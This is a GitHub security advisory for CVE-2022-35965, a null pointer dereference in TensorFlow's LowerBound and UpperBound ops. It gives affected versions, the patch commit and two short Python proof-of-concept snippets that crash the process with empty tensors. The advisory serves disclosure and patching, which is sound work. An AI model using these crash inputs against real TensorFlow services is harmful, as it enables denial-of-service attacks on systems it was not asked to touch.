# [M] TensorFlow vulnerable to segfault in `LowerBound` and `UpperBound`

## Summary
Severity: Medium
Advisory: GHSA-qxpx-j395-pw36
CVE: CVE-2022-35965
CWE: CWE-476
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-qxpx-j395-pw36
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
If `LowerBound` or `UpperBound` is given an empty`sorted_inputs` input, it results in a `nullptr` dereference, leading to a segfault that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

out_type = tf.int32
sorted_inputs = tf.constant([], shape=[10,0], dtype=tf.float32)
values = tf.constant([], shape=[10,10,0,10,0], dtype=tf.float32)
tf.raw_ops.LowerBound(sorted_inputs=sorted_inputs, values=values, out_type=out_type)
```
```python
import tensorflow as tf

out_type = tf.int64
sorted_inputs = tf.constant([], shape=[2,2,0,0,0,0,0,2], dtype=tf.float32)
values = tf.constant(0.372660398, shape=[2,4], dtype=tf.float32)
tf.raw_ops.UpperBound(sorted_inputs=sorted_inputs, values=values, out_type=out_type)
```

### Patches
We have patched the issue in GitHub commit [bce3717eaef4f769019fd18e990464ca4a2efeea](https://github.com/tensorflow/tensorflow/commit/bce3717eaef4f769019fd18e990464ca4a2efeea).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qxpx-j395-pw36
- https://nvd.nist.gov/vuln/detail/CVE-2022-35965
- https://github.com/tensorflow/tensorflow/commit/bce3717eaef4f769019fd18e990464ca4a2efeea
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
